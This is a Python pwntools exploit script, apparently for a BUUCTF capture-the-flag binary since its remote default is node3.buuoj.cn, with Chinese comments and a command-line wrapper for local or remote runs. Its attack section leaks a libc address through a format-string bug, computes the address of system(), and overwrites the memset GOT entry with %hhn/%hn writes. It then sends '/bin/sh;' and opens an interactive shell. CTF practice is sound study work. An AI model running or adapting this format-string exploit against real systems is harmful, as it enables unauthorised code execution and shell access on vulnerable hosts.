from pwn import *
from LibcSearcher import LibcSearcher
import click
import sys
import os
import time

FILENAME = '#' # 要执行的文件名
DEBUG = 1 # 是否为调试模式
TMUX = 0 # 是否开启TMUX
GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置
IP = None # 远程连接的IP
PORT = None # 远程连接的端口
LOCAL_LOG = 1 # 本地LOG是否开启
PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置
STOP_FUNCTION = 1 # STOP方法是否开启


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')
@click.argument('filename', nargs=1, type=str, required=0, default=None)
@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')
@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')
@click.option('-gb', '--gdb-breakpoint', default=None, type=str, help='Set a gdb breakpoint while tmux is enabled, is a hex address or a function name. Default value:None')
@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')
@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')
@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')
@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')
@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')
def parse_command_args(filename, debug, tmux, gdb_breakpoint, ip, 
                       port, local_log, pwn_log, stop_function):
    '''FILENAME: The filename of current directory to pwn'''
    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION
    # assign
    FILENAME = filename
    DEBUG = debug
    TMUX = tmux
    GDB_BREAKPOINT = gdb_breakpoint
    IP = ip
    PORT = port
    LOCAL_LOG = local_log
    PWN_LOG_LEVEL = pwn_log
    STOP_FUNCTION = stop_function
    # print('[&]', filename, debug, tmux, gdb_breakpoint, ip, port, local_log, pwn_log, stop_function)
    # change
    if PORT:
        DEBUG = 0
        TMUX = 0
        STOP_FUNCTION = 0
        GDB_BREAKPOINT = None
        if IP is None:
            IP = 'node3.buuoj.cn'
    
    if DEBUG:
        IP = None
        PORT = None
    
    # assert
    assert not (FILENAME is None and PORT is None), 'para error'
    assert not (FILENAME is None and DEBUG == 1), 'para error'
    assert not (PORT is not None and DEBUG == 1), 'para error'
    assert not (DEBUG == 0 and TMUX == 1), 'para error'
    
    # print
    click.echo('=' * 50)
    click.echo(' [+] Args info:\n')
    if FILENAME:
        click.echo('  filename: %s' % FILENAME)
    click.echo('  debug enabled: %d' % DEBUG)
    click.echo('  tmux enabled: %d' % TMUX)
    if GDB_BREAKPOINT:
        click.echo('  gdb breakpoint: %s' % GDB_BREAKPOINT)
    if IP:
        click.echo('  remote ip: %s' % IP)
    if PORT:
        click.echo('  remote port: %d' % PORT)
    click.echo('  local log enabled: %d' % LOCAL_LOG)
    click.echo('  pwn log_level: %s' % PWN_LOG_LEVEL)
    click.echo('  stop function enabled: %d' % STOP_FUNCTION)
    click.echo('=' * 50)
    

parse_command_args.main(standalone_mode=False)

if len(sys.argv) == 2 and sys.argv[1] == '--help':
    sys.exit(0)

if DEBUG:
    io = process('./{}'.format(FILENAME))
else:
    io = remote(IP, PORT)

if TMUX:
    context.update(terminal=['tmux', 'splitw', '-h'])
    if GDB_BREAKPOINT is None:
        gdb.attach(io)
    elif '0x' in GDB_BREAKPOINT:
        gdb.attach(io, gdbscript='b *{}\nc\n'.format(GDB_BREAKPOINT))
    else:
        gdb.attach(io, gdbscript='b {}\nc\n'.format(GDB_BREAKPOINT))


if FILENAME:
    cur_elf = ELF('./{}'.format(FILENAME))
    print('[+] libc used ===> {}'.format(cur_elf.libc))

def LOG_ADDR(addr_name:str, addr:int):
    if LOCAL_LOG:
        log.success("{} ===> {}".format(addr_name, hex(addr)))
    else:
        pass

STOP_COUNT = 0
def STOP(idx:int=-1):
    if not STOP_FUNCTION:
        return
    if idx != -1:
        input("stop...{} {}".format(idx, proc.pidof(io)))
    else:
        global STOP_COUNT
        input("stop...{}  {}".format(STOP_COUNT, proc.pidof(io)))
        STOP_COUNT += 1


context.update(os='linux', log_level=PWN_LOG_LEVEL, arch='amd64')
##########################################
##############以下为攻击代码###############
##########################################

# ubuntu16 偏移为8 aaaaaaaa%8$lx
payload = b'%83$lx'
io.recv()
io.sendline(payload)
msg = io.recvline()
leak_addr = msg[9: -1]
libc_start_main_addr = int(leak_addr.decode(), 16) - 240
# libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
# lib_base_addr = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libc_start_main_addr + 0x24c50
# LOG_ADDR('lib_base_addr', lib_base_addr)
LOG_ADDR('system_addr', system_addr)
# 只需要改低位的4个字节即可
low_2_addr = system_addr & 0xffff
low_4_single_addr = (system_addr >> 16) & 0xff
LOG_ADDR('low_2_addr', low_2_addr)
LOG_ADDR('low_4_signle_addr', low_4_single_addr)
memset_got = 0x601038

assert low_4_single_addr > 0x11, 'once again!'
 
if low_4_single_addr >= 100:
    add = 4
else:
    add = 5

payload = b'/bin/sh;'
p2 = '%{}c%13$hhn'.format(low_4_single_addr - 0x11).ljust(16, 'a').encode() + '%{}c%14$hn'.format(low_2_addr - low_4_single_addr - add).ljust(16, 'a').encode() + p64(memset_got + 2) + p64(memset_got)

payload += p2
print(payload)
io.send(payload)

io.interactive()
